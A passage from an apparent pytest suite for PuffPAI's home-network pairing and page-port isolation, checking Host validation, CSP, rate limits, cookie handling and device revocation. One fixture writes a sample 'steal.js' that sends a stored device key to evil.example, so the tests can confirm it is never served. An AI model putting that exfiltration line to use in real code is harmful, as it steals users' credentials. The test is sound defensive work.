    assert "computer running your bot" in r.json["line"] and "127.0.0.1" not in json.dumps(r.json)
    r = d.open("POST", "/v1/packages/outside-app/open/home")
    assert r.status_code == 409 and "127.0.0.1" not in json.dumps(r.json) and "computer running your bot" in r.json["error"]
    # What the Desktop gets for one of ours names its own port, on the address this device uses.
    r = d.get("/v1/packages/made-app/frame")
    port = core.app.extensions[network.EXTENSION].page_port("made-app")
    assert r.json["ok"] is True and r.json["url"] == f"http://{ADDRESS}:{port}/"
    named = _paired(core, host=f"mybox.local:{core.app.extensions[network.EXTENSION].port}")
    assert named.get("/v1/packages/made-app/frame").json["url"] == f"http://mybox.local:{port}/"
    # And the Core never keeps a device's token to hand on: a try's or an app's environment can't hold what isn't there.
    db = (core.state / "tokens.db").read_bytes()
    assert token.encode() not in db and d.second.encode() not in db


def test_a_page_port_is_one_packages_for_good(apps, page_ports_bound, tmp_path):
    core = apps
    net = core.app.extensions[network.EXTENSION]
    first = net.page_ports()
    core.registry.delete("other-app") if hasattr(core.registry, "delete") else core.registry.update("other-app", status="removed")
    _add(core, tmp_path, "new-app", "made")
    second = net.page_ports()
    assert first["made-app"] == second["made-app"]
    assert second["new-app"] not in first.values()         # never another package's old origin (D53)


def test_a_full_page_range_says_on_the_computer(apps, page_ports_bound):
    core = apps
    net = core.app.extensions[network.EXTENSION]
    net.page_range = range(net.page_range.start, net.page_range.start + 1)
    ports = net.page_ports()
    assert len(ports) == 1
    d = _paired(core)
    missing = ({"made-app", "other-app"} - set(ports)).pop()
    assert d.get(f"/v1/packages/{missing}/frame").json["kind"] == "computer"


def test_the_desktop_csp_names_exact_origins_only(apps, page_ports_bound):
    core, d = apps, _paired(apps)
    r = d.get("/")
    csp = r.headers["Content-Security-Policy"]
    port = core.app.extensions[network.EXTENSION].page_port("made-app")
    assert f"frame-src http://{ADDRESS}:" in csp and f"http://{ADDRESS}:{port}" in csp
    assert "*" not in csp and "localhost" not in csp and "frame-ancestors 'none'" in csp
    assert r.headers["X-Frame-Options"] == "DENY"
    assert d.get("/v1/settings").json["network"] is True and d.get("/v1/settings").json["pages"] == ""


def test_real_listeners_end_to_end(apps, on, fake_server):
    """Real sockets: pair over the wire, the Desktop, a page on its own port, a removed device, then off."""
    core = apps
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    on.addresses, on.names, on.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    base = _free_port(STAND_IN)
    on.page_range = range(base, base + 20)
    assert on.open() is True
    origin = f"http://{STAND_IN}:{on.port}"

    def call(port, method, path, headers=None, body=None):
        c = http.client.HTTPConnection(STAND_IN, port, timeout=15)
        c.request(method, path, body=None if body is None else json.dumps(body), headers=headers or {})
        r = c.getresponse()
        data = r.read()
        c.close()
        return r, data

    try:
        r, _ = call(on.port, "GET", "/")
        assert r.status == 302
        code = pairing.new_code(core.state)
        r, data = call(on.port, "POST", "/v1/pair", {"Origin": origin, "X-PuffPAI": "1", **JSON_WRITE}, {"code": code})
        assert r.status == 200
        second = json.loads(data)["device_key"]
        cookie = r.getheader("Set-Cookie").split(";", 1)[0]
        h = {"Cookie": cookie, auth.DEVICE_HEADER: second}
        assert call(on.port, "GET", "/v1/settings", h)[0].status == 200
        assert call(on.port, "GET", "/v1/settings", {"Cookie": cookie})[0].status == 401
        assert call(on.port, "GET", "/", {"Cookie": cookie})[0].status == 200
        r, data = call(on.port, "GET", "/v1/network/pages", h)
        assert r.status == 200
        ports = json.loads(data)["ports"]
        assert set(ports) == {"made-app", "other-app"}
        passes = dict(x.split(";", 1)[0].split("=", 1) for x in r.headers.get_all("Set-Cookie"))
        port = ports["made-app"]
        mine = f"{network.page_cookie_name(port)}={passes[network.page_cookie_name(port)]}"
        assert call(port, "GET", "/")[0].status == 401
        assert call(port, "GET", "/", {"Cookie": cookie, auth.DEVICE_HEADER: second})[0].status == 401
        _FakePackage.seen = []
        everything = "; ".join([mine, cookie])
        r, data = call(port, "GET", "/", {"Cookie": everything, auth.DEVICE_HEADER: second})
        assert r.status == 200 and data == b"page" and r.getheader("Set-Cookie") is None
        got = _FakePackage.seen[-1]["headers"]
        assert "cookie" not in got and auth.DEVICE_HEADER.lower() not in got and second not in json.dumps(got)
        wrong = f"{network.page_cookie_name(ports['other-app'])}={passes[network.page_cookie_name(port)]}"
        assert call(ports["other-app"], "GET", "/", {"Cookie": wrong})[0].status == 401
        # Host is checked on a real page socket too, and a wrong one reaches no package
        assert call(port, "GET", "/", {"Cookie": mine, "Host": "evil.example"})[0].status == 421
        mine_id = core.tokens.device_id(cookie.split("=", 1)[1])
        assert core.tokens.revoke_browser(mine_id) is True
        assert call(port, "GET", "/", {"Cookie": mine})[0].status == 401
        assert call(on.port, "GET", "/v1/settings", h)[0].status == 401
    finally:
        network.save_on(core.state, False)
        on.apply()
    assert _refused(STAND_IN, on.port) and _refused(STAND_IN, port)


# -- two bots on one computer ------------------------------------------------------------------------------------------
@pytest.fixture
def two_bots(tmp_path):
    a = create_app(tmp_path / "bot-a", port=8420, pages_port=8422)
    b = create_app(tmp_path / "bot-b", port=8430, pages_port=8432)
    for app in (a, b):
        n = app.extensions[network.EXTENSION]
        n.addresses, n.names = (lambda: {ADDRESS}), (lambda: set())
        network.save_on(app.extensions["puffpai"].state, True)
    return a, b


def test_two_bots_keep_their_own_network_cookies(two_bots):
    a, b = two_bots
    core_a, core_b = a.extensions["puffpai"], b.extensions["puffpai"]
    d_a, d_b = _paired(core_a), _paired(core_b)
    name_a, name_b = network.cookie_name(a.extensions[network.EXTENSION].port), network.cookie_name(b.extensions[network.EXTENSION].port)
    assert name_a == "puffpai_device_8423" and name_b == "puffpai_device_8433"
    assert set(d_a.cookies) == {name_a} and set(d_b.cookies) == {name_b}
    # One browser, one address: cookies are not split by port, so each bot sees both. Each still knows its own.
    both = {**d_a.cookies, **d_b.cookies}
    d_a.cookies, d_b.cookies = dict(both), dict(both)
    assert d_a.get("/v1/settings").status_code == 200 and d_b.get("/v1/settings").status_code == 200
    # Bot A's device is nothing to bot B, with B's cookie name or A's second half.
    stolen = Device(b)
    stolen.cookies, stolen.second = {name_b: both[name_a]}, d_a.second
    assert stolen.get("/v1/settings").status_code == 401
    assert stolen.get("/", second=False).status_code == 302


def test_a_page_port_never_takes_another_bots_device(two_bots, tmp_path):
    a, b = two_bots
    core_a, core_b = a.extensions["puffpai"], b.extensions["puffpai"]
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    _add(core_a, tmp_path / "a", "same-id", "made")
    _add(core_b, tmp_path / "b", "same-id", "made")
    d_a = _paired(core_a)
    token = d_a.cookies[network.cookie_name(a.extensions[network.EXTENSION].port)]
    value = core_a.tokens.page_pass(token, "same-id")
    assert core_a.tokens.page_pass_ok(value, "same-id") is True
    assert core_b.tokens.page_pass_ok(value, "same-id") is False
    # and over the route
    b.extensions[network.EXTENSION].page_ports()
    port_b = b.extensions[network.EXTENSION].page_port("same-id")
    d = Device(b)
    d.cookies = {network.page_cookie_name(port_b): value}
    assert page(core_b, "same-id", d).status_code == 401
    # their page ports never overlap, for a package with the same name
    a.extensions[network.EXTENSION].page_ports()
    assert a.extensions[network.EXTENSION].page_port("same-id") != port_b


# -- the ports ---------------------------------------------------------------------------------------------------------
def test_ports_follow_the_bot_and_stay_off_what_is_taken():
    from puffpai_core.steward.ports import PORT_RANGE
    seen_pages: set[int] = set()
    bot_ports = {8420 + 10 * n + k for n in range(51) for k in (0, 1, 2)}
    for n in range(51):
        lan, pages = network.network_ports(8420 + 10 * n)
        assert lan == 8420 + 10 * n + 3
        assert lan not in bot_ports and lan not in PORT_RANGE
        assert pages.start >= 19000 and pages.stop <= 49152 and len(pages) == 100     # under Windows' own ephemeral range
        assert not seen_pages & set(pages) and not set(pages) & set(PORT_RANGE) and not set(pages) & bot_ports
        seen_pages |= set(pages)
    assert network.network_ports(8420)[0] == 8423        # never 8420 to 8422


def test_the_network_ports_count_as_the_cores_own(apps, page_ports_bound):
    from puffpai_core.api.groups.packages import _core_ports
    core = apps
    net = core.app.extensions[network.EXTENSION]
    with core.app.test_request_context("/"):
        got = _core_ports(core)
    assert net.port in got and net.page_range.start in got


# -- this computer's addresses: Windows and Linux -----------------------------------------------------------------------
def test_addresses_on_linux_with_faked_results():
    """Debian names the computer 127.0.1.1 in its hosts file, so the name alone finds nothing there."""
    got = network.own_addresses(named=lambda: ["127.0.1.1"], interfaces=lambda: ["127.0.0.1", "192.168.1.20", "172.17.0.1", "8.8.8.8"],
                                route=lambda: ["192.168.1.20"])
    assert got == {"192.168.1.20", "172.17.0.1"}


def test_addresses_on_windows_with_faked_results():
    got = network.own_addresses(named=lambda: ["10.0.0.4", "169.254.1.1", "20.30.40.50"], interfaces=lambda: [], route=lambda: ["10.0.0.4"])
    assert got == {"10.0.0.4", "169.254.1.1"}


def test_addresses_when_nothing_answers():
    assert network.own_addresses(named=lambda: [], interfaces=lambda: [], route=lambda: []) == set()


@pytest.mark.skipif(os.name != "nt", reason="Windows only: there is no fcntl here")
def test_windows_has_no_interface_lookup():
    assert network._interface_addresses() == []


@pytest.mark.skipif(os.name == "nt", reason="not run on Windows: the owner's Linux try covers it")
def test_linux_interface_lookup_runs():
    assert isinstance(network._interface_addresses(), list)


def test_own_names():
    assert network.own_names(lambda: "MyBox") == {"mybox", "mybox.local"}
    assert network.own_names(lambda: "mybox.example.com") == {"mybox", "mybox.local"}
    assert network.own_names(lambda: "localhost") == set()         # a Linux box with no name: never localhost
    assert network.own_names(lambda: "") == set()
    assert network.own_names(lambda: "a b/c") == set()


def test_peer_allowed():
    for good in ("192.168.0.1", "10.0.0.1", "172.31.1.1", "169.254.1.1", "fe80::1", "fc00::1", "::ffff:10.0.0.1"):
        assert network.peer_allowed(good) is True, good
    for bad in ("8.8.8.8", "127.0.0.1", "::1", "100.64.0.1", "172.32.0.1", "::ffff:8.8.8.8", "", "x", "2001:db8::1"):
        assert network.peer_allowed(bad) is False, bad


# -- the addresses she gives: a container with published ports ---------------------------------------------------------
GIVEN = "192.168.1.50"
GATEWAY = "172.17.0.1"                 # what the userland proxy shows; DNAT shows the client's own address


def _nothing_looked_up():
    raise AssertionError("no lookup when she gave the addresses")


def test_given_addresses_and_names_are_the_only_ones(monkeypatch):
    monkeypatch.setenv(network.ADDRESSES_ENV, f" {GIVEN}, Orin.local ,orin2,10.0.0.7,")
    got = network.own_addresses(named=_nothing_looked_up, interfaces=_nothing_looked_up, route=_nothing_looked_up)
    assert got == {GIVEN, "10.0.0.7"}
    assert network.own_names(lambda: "container") == {"orin.local", "orin2"}


def test_only_names_given_means_no_address_is_looked_up(monkeypatch):
    monkeypatch.setenv(network.ADDRESSES_ENV, "orin.local")
    assert network.own_addresses(named=_nothing_looked_up, interfaces=_nothing_looked_up, route=_nothing_looked_up) == set()
    assert network.urls_of(8433, network.own_addresses(), network.own_names()) == ["http://orin.local:8433/"]


@pytest.mark.parametrize("bad", [
    "8.8.8.8", "100.64.0.1", "172.32.0.1",                                      # public, and a VPN's range
    "127.0.0.1", "127.0.1.1", "localhost", "LOCALHOST", "localhost.local",      # loopback
    "0.0.0.0", "*", "*.local", "255.255.255.255", "224.0.0.1",                  # wildcard and not one computer
    "::1", "fe80::1", "fc00::1", "::ffff:192.168.1.50", "[fe80::1]",            # IPv6 forms, though peer_allowed takes some
    "192.168.1.50%eth0", "192.168.1.50:8433", "192.168.1.50/24", "192.168.01.50",
    "2130706433", "0x7f000001", "134744072", "127.1", "0x7f.local",             # numbers a browser reads as an address
    "example.com", "orin.example.local", "orin.local.", ".local", "a b", "-x",
    "http://192.168.1.50/", "", " ", ",", " , ,",
])
def test_a_bad_entry_is_dropped_and_nothing_valid_counts_as_unset(monkeypatch, bad):
    monkeypatch.setenv(network.ADDRESSES_ENV, bad)
    assert network._given() is None
    assert network.own_addresses(named=lambda: [ADDRESS], interfaces=lambda: [], route=lambda: []) == {ADDRESS}
    assert network.own_names(lambda: "mybox") == {"mybox", "mybox.local"}
    monkeypatch.setenv(network.ADDRESSES_ENV, f"{bad},{GIVEN}")
    assert network.own_addresses() == {GIVEN} and network.own_names() == set()


@pytest.mark.parametrize("peer", [GATEWAY, PEER], ids=["userland-proxy", "dnat"])
def test_a_container_answers_at_the_given_address_and_pairs_there(core, monkeypatch, peer):
    monkeypatch.setenv(network.ADDRESSES_ENV, f"{GIVEN},orin.local")
    network.save_on(core.state, True)
    net = core.app.extensions[network.EXTENSION]
    for host in (f"{GIVEN}:{net.port}", f"ORIN.local:{net.port}"):
        assert Device(core.app, peer, host).get("/pair").status_code == 200, host
    d = _paired(core, peer, f"{GIVEN}:{net.port}")                               # POST /v1/pair: Origin lines up with Host
    assert d.get("/v1/settings").status_code == 200
    assert d.open("POST", "/v1/pair", body={"code": "x"}, headers={"Origin": f"http://172.17.0.2:{net.port}"}).status_code == 403


def test_every_other_host_and_a_wrong_port_are_still_421(core, monkeypatch):
    monkeypatch.setenv(network.ADDRESSES_ENV, f"{GIVEN},orin.local")
    network.save_on(core.state, True)
    port = core.app.extensions[network.EXTENSION].port
    for host in (f"192.168.1.51:{port}", f"172.17.0.2:{port}", f"evil.example:{port}", f"8.8.8.8:{port}", f"localhost:{port}",
                 f"{socket.gethostname()}:{port}", f"orin.local.:{port}", GIVEN, f"{GIVEN}:{port + 1}", f"orin.local:{port + 1}"):
        assert Device(core.app, GATEWAY, host).get("/pair").status_code == 421, host


def test_a_given_address_never_lets_a_public_peer_in(core, monkeypatch):
    monkeypatch.setenv(network.ADDRESSES_ENV, GIVEN)
    network.save_on(core.state, True)
    port = core.app.extensions[network.EXTENSION].port
    assert Device(core.app, "8.8.8.8", f"{GIVEN}:{port}").get("/pair").status_code == 403


def test_page_listeners_line_up_with_the_host_she_used(core, monkeypatch):
    monkeypatch.setenv(network.ADDRESSES_ENV, f"{GIVEN},orin.local")
    net = core.app.extensions[network.EXTENSION]
    page = net.page_range.start
    settings = core.state / "settings" / "network.json"
    settings.parent.mkdir(parents=True, exist_ok=True)
    settings.write_text(json.dumps({"on": True, "pages": {"made-app": page}}), encoding="utf-8")
    assert net.desktop_origin(f"{GIVEN}:{net.port}") == f"http://{GIVEN}:{net.port}"
    assert net.page_origins(f"orin.local:{net.port}") == [f"http://orin.local:{page}"]

    def asked(host):
        return net.refuse({"puffpai.listener": NETWORK_PAGE_LISTENER, "REMOTE_ADDR": GATEWAY, "SERVER_PORT": str(page),
                           "HTTP_HOST": host})
    assert asked(f"{GIVEN}:{page}") is None and asked(f"orin.local:{page}") is None
    assert asked(f"{GIVEN}:{page + 1}")[0].startswith("421") and asked(f"172.17.0.2:{page}")[0].startswith("421")


def test_what_she_is_told_to_open_lists_only_what_she_gave(core, monkeypatch):
    """The pair screen itself names no address (``ui.ui_pair_screen``). These are the lists that do."""
    monkeypatch.setenv(network.ADDRESSES_ENV, f"{GIVEN},orin")
    network.save_on(core.state, True)
    net = core.app.extensions[network.EXTENSION]
    want = [f"http://{GIVEN}:{net.port}/", f"http://orin:{net.port}/"]
    assert net.view()["urls"] == want                                           # puffpai network status, Settings
    terminal = core.tokens.issue_device(f"{TERMINAL_LABEL} (run t)")
    core.terminal_label = f"{TERMINAL_LABEL} (run t)"
    r = core.app.test_client().post("/v1/network/code", headers=local(terminal))
    assert r.status_code == 200 and r.json["urls"] == want                      # the code's own answer


# -- the terminal ------------------------------------------------------------------------------------------------------
@pytest.fixture
def bot_folder(tmp_path, monkeypatch):
    import puffpai_core.paths as paths
    monkeypatch.setattr(paths, "state_dir", lambda: tmp_path)
    monkeypatch.setattr(network, "own_addresses", lambda: {ADDRESS})
    monkeypatch.setattr(network, "own_names", lambda: {"mybox", "mybox.local"})
    monkeypatch.setattr(cli, "_terminal", lambda: None)
    monkeypatch.setattr(cli, "held_now", lambda: None)
    return tmp_path


def _run(argv, capsys):
    args = cli.build_parser().parse_args(argv)
    code = args.fn(args)
    return code, capsys.readouterr().out


def test_cli_on_needs_the_running_core_and_off_always_works(bot_folder, capsys):
    network.save_on(bot_folder, False)
    code, out = _run(["network", "on"], capsys)
    assert code == 1 and "not running" in out and network.saved_on(bot_folder) is False
    network.save_on(bot_folder, True)
    code, out = _run(["network", "status"], capsys)
    assert code == 0 and out.startswith("On")
    code, out = _run(["network", "off"], capsys)
    assert code == 0 and network.saved_on(bot_folder) is False
    code, out = _run(["network"], capsys)
    assert code == 0 and out.startswith("Off")


def test_cli_with_the_core_running_says_what_opens(bot_folder, capsys, monkeypatch):
    monkeypatch.setattr(cli, "_terminal", lambda: {"port": 8420, "token": "x"})
    answer = {"on": True, "open": True, "port": 8423, "line": "", "urls": [f"http://{ADDRESS}:8423/"], "worth_knowing": network.WORTH_KNOWING}
    asked = []
    monkeypatch.setattr(cli, "_call", lambda info, method, path, body=None: (asked.append((method, path, body)) or (200, answer)))
    code, out = _run(["network", "on"], capsys)
    assert code == 0 and asked == [("PUT", "/v1/network", {"on": True})]
    assert f"http://{ADDRESS}:8423/" in out and "use a network you trust" in out
    monkeypatch.setattr(cli, "_call", lambda info, method, path, body=None: (200, {**answer, "open": False, "line": "Another program is using port 8423."}))
    code, out = _run(["network", "on"], capsys)
    assert code == 1 and "Another program" in out


def test_puffpai_pair_prints_only_what_she_gave(tmp_path, monkeypatch, capsys):
    import puffpai_core.paths as paths
    monkeypatch.setattr(paths, "state_dir", lambda: tmp_path)
    monkeypatch.setattr(cli, "_terminal", lambda: None)
    monkeypatch.setattr(cli, "held_now", lambda: None)
    monkeypatch.setenv(network.ADDRESSES_ENV, GIVEN)
    network.save_on(tmp_path, True)
    code, out = _run(["pair"], capsys)
    assert code == 0 and [w for w in out.split() if w.endswith(":8423/")] == [f"http://{GIVEN}:8423/"]


def test_pair_says_the_network_code_only_when_it_is_on(bot_folder, capsys):
    network.save_on(bot_folder, False)
    code, out = _run(["pair"], capsys)
    assert code == 0 and "home network" not in out and "puffpai.localhost" in out


def test_a_code_from_puffpai_pair_works_at_the_address_it_prints(bot_folder, capsys):
    """A bot with no screen: everything to type on the laptop is in this one printout, by a real route."""
    network.save_on(bot_folder, True)
    code, out = _run(["pair"], capsys)
    assert code == 0 and f"http://{ADDRESS}:8423/" in out and "http://mybox.local:8423/" in out and "use a network you trust" in out
    typed = out.split("type this code:")[1].split()[0]
    app = create_app(bot_folder, port=8420)
    d = Device(app, host=f"{ADDRESS}:8423")
    assert d.get("/pair").status_code == 200
    assert d.pair(typed).status_code == 200
    assert d.get("/v1/settings").status_code == 200
    assert d.pair(typed).status_code == 401                        # one use


def test_pair_says_when_there_is_no_address_to_type(bot_folder, capsys, monkeypatch):
    monkeypatch.setattr(network, "own_addresses", lambda: set())
    monkeypatch.setattr(network, "own_names", lambda: set())
    network.save_on(bot_folder, True)
    code, out = _run(["pair"], capsys)
    assert code == 0 and "no home-network address" in out


def test_pair_names_the_running_cores_own_port(bot_folder, capsys, monkeypatch):
    from puffpai_core import corelock
    monkeypatch.setattr(corelock, "holder", lambda state: {"kind": corelock.CORE, "port": 8430})
    network.save_on(bot_folder, True)
    code, out = _run(["pair"], capsys)
    assert code == 0 and f"http://{ADDRESS}:8433/" in out


# -- the Desktop's logic ------------------------------------------------------------------------------------------------
NODE = shutil.which("node")


@pytest.mark.skipif(NODE is None, reason="node is not installed")
def test_desktop_logic_on_the_network():
    proc = subprocess.run([NODE, str(REPO / "tests" / "js" / "lan_pairing.test.js")], capture_output=True, text=True, timeout=60)
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == "ok"


@pytest.mark.skipif(NODE is None, reason="node is not installed")
def test_changed_desktop_files_parse():
    web = REPO / "packages" / "desktop" / "web"
    for name in ("logic.js", "desktop.js", "pages/settings.js", "pages/chat.js"):
        proc = subprocess.run([NODE, "--check", str(web / name)], capture_output=True, text=True, timeout=60)
        assert proc.returncode == 0, (name, proc.stderr)


# -- Local servers still start as before ---------------------------------------------------------------------------------
def test_make_servers_still_makes_only_the_two(core):
    a, b = _free_port(), _free_port()
    servers = make_servers(core.app, a, b)
    try:
        assert len(servers) == 2
    finally:
        stop_servers(servers)


# -- the verifier's findings on D130 --------------------------------------------------------------------------------------
def _ui_package(core, tmp_path, id, origin):
    """A Desktop of someone else's, with a script of its own, as the Package Manager records one."""
    folder = tmp_path / id
    shutil.copytree(HELLO, folder)
    manifest = json.loads((folder / "puffpai.json").read_text(encoding="utf-8"))
    manifest.update(id=id, kind="ui", run={"default": {"type": "static", "dir": "."}})
    (folder / "puffpai.json").write_text(json.dumps(manifest), encoding="utf-8")
    (folder / "index.html").write_text("<script src='/ui/steal.js'></script>THIRD PARTY DESKTOP", encoding="utf-8")
    (folder / "steal.js").write_text("fetch('//evil.example/' + localStorage.getItem('puffpai.device_key'))", encoding="utf-8")
    core.installs.set(id, folder, link=True, source=str(folder))
    core.registry.add(row_from_manifest(manifest, origin, manifest_sha=manifest_sha(folder)))


def _real_network(on, core):
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    on.addresses, on.names, on.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    base = _free_port(STAND_IN)
    on.page_range = range(base, base + 20)
    assert on.open() is True
    origin = f"http://{STAND_IN}:{on.port}"
    c = http.client.HTTPConnection(STAND_IN, on.port, timeout=30)
    c.request("POST", "/v1/pair", body=json.dumps({"code": pairing.new_code(core.state)}),
              headers={"Origin": origin, "X-PuffPAI": "1", "Content-Type": "application/json"})
    r = c.getresponse()
    data = json.loads(r.read())
    cookie = r.getheader("Set-Cookie").split(";", 1)[0]
    c.close()
    return {"Cookie": cookie, auth.DEVICE_HEADER: data["device_key"], "Origin": origin, "X-PuffPAI": "1", "Content-Type": "application/json"}


def _raw(port, request: bytes) -> bytes:
    """Bytes on a socket, as no well-behaved client would send them. One answer back."""
    with socket.create_connection((STAND_IN, port), timeout=15) as s:
        s.sendall(request)
        s.shutdown(socket.SHUT_WR)
        out = b""
        while True:
            got = s.recv(65536)
            if not got:
                return out
            out += got


def test_a_chosen_desktop_is_never_served_on_the_network(core, on, tmp_path):
    """Third-party code never runs on the origin that holds a device's second half."""
    _ui_package(core, tmp_path, "third-ui", "github:someone/third-ui")
    key = core.tokens.issue_device("a device")
    assert core.app.test_client().put("/v1/settings/ui", json={"id": "third-ui"}, headers=local(key)).status_code == 200
    d = _paired(core)
    r = d.get("/", second=False)
    assert r.status_code == 200 and b"THIRD PARTY" not in r.data and b"logic.js" in r.data     # the built-in Desktop
    assert d.get("/ui/steal.js", second=False).status_code == 404
    assert d.get("/ui/logic.js", second=False).status_code == 200
    # D79's own address still serves it: older, and out of scope here. This line says so until that is decided.
    c = core.app.test_client(use_cookies=False)
    assert c.get("/ui/steal.js", base_url=f"http://puffpai.localhost:{core.port}").status_code == 200
    tile = (REPO / "packages" / "desktop" / "web" / "pages" / "settings.js").read_text(encoding="utf-8")
    assert "A Desktop you choose shows on the computer BuildBot runs on. Other devices get the built-in one." in tile


def test_a_page_port_redirects_nobody_to_a_package_id(apps, on):
    core = apps
    _real_network(on, core)
    try:
        port = on.open_pages()["made-app"]
        host = f"Host: {STAND_IN}:{port}\r\n\r\n".encode()
        for line in (b"GET x HTTP/1.1\r\n", b"GET a//b HTTP/1.1\r\n", b"GET /a//b HTTP/1.1\r\n", b"GET /a/../b HTTP/1.1\r\n", b"GET .. HTTP/1.1\r\n"):
            answer = _raw(port, line + host)
            assert b"made-app" not in answer and b"/pkg/" not in answer, line
            assert not answer.startswith((b"HTTP/1.1 30", b"HTTP/1.1 200")), line
        assert _FakePackage.seen == []
    finally:
        on.close()


def test_only_a_paired_device_sees_the_page_ports(apps, page_ports_bound):
    core, net = apps, apps.app.extensions[network.EXTENSION]
    ports = [str(p) for p in net.page_ports().values()]
    assert ports
    stranger = Device(core.app)
    for path in ("/", "/window/", "/v1/settings", "/no-such-route", "/v1/signin", "/ui/logic.js", "/pair"):
        r = stranger.get(path)
        assert not any(p in r.headers.get("Content-Security-Policy", "") for p in ports), path
    d = _paired(core)
    assert all(p in d.get("/", second=False).headers["Content-Security-Policy"] for p in ports)
    assert all(p in d.get("/window/", second=False).headers["Content-Security-Policy"] for p in ports)


def test_a_burst_of_wrong_codes_never_passes_the_limit(core, on, monkeypatch):
    def slow_wrong(_state, _code, now=None):
        time.sleep(0.4)                                    # every try is inside the check at once
        return False
    monkeypatch.setattr(pairing, "redeem", slow_wrong)
    got: list[int] = []
    ready = threading.Barrier(16)

    def one():
        d = Device(core.app)
        ready.wait()
        got.append(d.open("POST", "/v1/pair", body={"code": "WRON-GWRO-NGXX"}).status_code)
    threads = [threading.Thread(target=one) for _ in range(16)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(20)
    assert got.count(401) == network.PairLimit.PER_PEER and got.count(429) == 16 - network.PairLimit.PER_PEER


def test_a_right_code_never_counts_against_the_limit(core, on):
    for _ in range(network.PairLimit.PER_PEER + 2):
        assert Device(core.app).pair(pairing.new_code(core.state)).status_code == 200


@pytest.mark.parametrize("value", ["9999999999.\u00e9", "9" * 5000 + ".a", "\u00b2.a", "\u0663.a", "9999999999.\udce9", "", ".", "1.", ".a", "-1.a"])
def test_a_bad_page_pass_is_only_no(core, value):
    assert core.tokens.page_pass_ok(value, "made-app") is False


@pytest.mark.parametrize("value", ["\u00e9", "\udce9", "9" * 5000, "x\x00y"])
def test_a_bad_token_or_second_half_is_only_no(core, value):
    key = core.tokens.issue_device(f"{auth.BROWSER_LABEL}a phone")
    core.tokens.bind_device(key)
    assert core.tokens.lookup(value) is None
    assert core.tokens.bound_ok(key, value) is False and core.tokens.bound_ok(value, "x") is False


def test_bad_bytes_on_a_real_socket_are_a_401_never_a_500(apps, on):
    core = apps
    h = _real_network(on, core)
    cookie = h["Cookie"].split("=", 1)[0].encode()
    try:
        port = on.open_pages()["made-app"]

        def host(p):
            return f"Host: {STAND_IN}:{p}\r\n".encode()
        name = network.page_cookie_name(port).encode()
        for bad in (b"9999999999.\xc3\xa9", b"9999999999.\xe9", b"9" * 5000 + b".a", b"\xc2\xb2.a", b"\xff\xfe"):
            answer = _raw(port, b"GET / HTTP/1.1\r\n" + host(port) + b"Cookie: " + name + b"=" + bad + b"\r\n\r\n")
            assert answer.startswith(b"HTTP/1.1 401"), bad[:20]
            answer = _raw(on.port, b"GET /v1/settings HTTP/1.1\r\n" + host(on.port) + b"Cookie: " + cookie + b"=" + bad + b"\r\n\r\n")
            assert answer.startswith(b"HTTP/1.1 401"), bad[:20]
            answer = _raw(on.port, b"GET /v1/settings HTTP/1.1\r\n" + host(on.port) + b"Cookie: " + h["Cookie"].encode()
                          + b"\r\nX-PuffPAI-Device: " + bad + b"\r\n\r\n")
            assert answer.startswith(b"HTTP/1.1 401"), bad[:20]
    finally:
        on.close()


def test_removing_a_device_ends_its_event_stream_now(core, on):
    h = _real_network(on, core)
    try:
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=70)
        c.request("GET", "/v1/events?timeout=60", headers=h)
        stream = c.getresponse()
        assert stream.status == 200 and stream.readline().startswith(b"retry:")
        other = _paired(core, peer="192.168.1.70", host=f"{STAND_IN}:{on.port}")
        began = time.monotonic()
        mine = core.tokens.device_id(h["Cookie"].split("=", 1)[1])
        assert other.open("DELETE", f"/v1/devices/{mine}").status_code == 200
        stream.read()                                       # to its end
        assert time.monotonic() - began < 8                 # not after its 60 seconds, nor its next heartbeat
        c.close()
    finally:
        on.close()


@pytest.mark.skipif(os.name != "nt", reason="the shells these open are PowerShell and cmd; the owner's Linux try covers the rest")
def test_removing_a_device_closes_its_shells_and_ends_their_streams_now(core, on, shells):
    h = _real_network(on, core)
    try:
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=30)
        c.request("POST", "/v1/dev/shell", body=json.dumps({"shell": "cmd"}), headers=h)
        r = c.getresponse()
        assert r.status == 201
        sid = json.loads(r.read())["id"]
        sh = shells.get(sid)
        assert sh.open is True
        c.close()
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=70)
        c.request("GET", f"/v1/dev/shell/{sid}/events?timeout=60", headers=h)
        stream = c.getresponse()
        assert stream.status == 200 and stream.readline().startswith(b"retry:")
        other = _paired(core, peer="192.168.1.70", host=f"{STAND_IN}:{on.port}")
        began = time.monotonic()
        mine = core.tokens.device_id(h["Cookie"].split("=", 1)[1])
        assert other.open("DELETE", f"/v1/devices/{mine}").status_code == 200
        rest = stream.read()
        assert time.monotonic() - began < 20 and b'"exit"' in rest
        assert sh.open is False and shells.get(sid) is None
        c.close()
    finally:
        on.close()


def test_removing_one_device_leaves_anothers_shell_alone(core, on, monkeypatch):
    from puffpai_core.api.groups import dev
    closed = []
    mgr = dev.shells(core.app)
    monkeypatch.setattr(mgr, "close", lambda id, why="closed": closed.append((id, why)) or True)
    a, b = _paired(core), _paired(core, peer="192.168.1.70")
    token_a = a.cookies[network.cookie_name(on.port)]
    token_b = b.cookies[network.cookie_name(on.port)]

    def fake(token):
        return type("S", (), {"owner": dev.hashlib.sha256(token.encode()).hexdigest()})()
    monkeypatch.setattr(mgr, "_shells", {"sa": fake(token_a), "sb": fake(token_b)})
    assert b.open("DELETE", f"/v1/devices/{core.tokens.device_id(token_a)}").status_code == 200
    assert closed == [("sa", "device_removed")]


def test_a_cookie_alone_on_the_recovery_page_learns_no_folder_or_id(core, on, tmp_path, monkeypatch):
    from puffpai_core.wizard import terminal
    monkeypatch.setattr(terminal, "cli_command", lambda *a: "C:\\Users\\someone\\secret folder\\puffpai.cmd pair --running")
    _ui_package(core, tmp_path, "third-ui", "github:someone/third-ui")
    key = core.tokens.issue_device("a device")
    assert core.app.test_client().put("/v1/settings/ui", json={"id": "third-ui"}, headers=local(key)).status_code == 200
    d = _paired(core)
    r = d.get("/v1/recover", second=False)
